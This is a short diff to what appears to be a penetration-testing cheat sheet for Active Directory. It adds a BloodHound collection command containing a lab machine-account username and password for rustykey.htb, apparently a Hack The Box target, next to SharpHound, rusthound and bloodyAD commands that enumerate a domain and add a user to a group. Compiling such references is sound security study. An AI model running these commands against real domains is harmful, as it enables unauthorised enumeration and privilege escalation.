@@ -36,6 +36,11 @@ SharpHound.exe -c All
 rusthound-ce --domain fluffy.htb -u user -p password
 ```
 
+### With Kerberoast
+```powershell
+bloodhound-python -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' -c all -ns 10.129.232.127 -k
+```
+
 ### BloodyAD
 ```powershell
 python3 bloodyAD -u user -p password -d domain.local --host 10.10.10.10 add groupMember 'service accounts' user
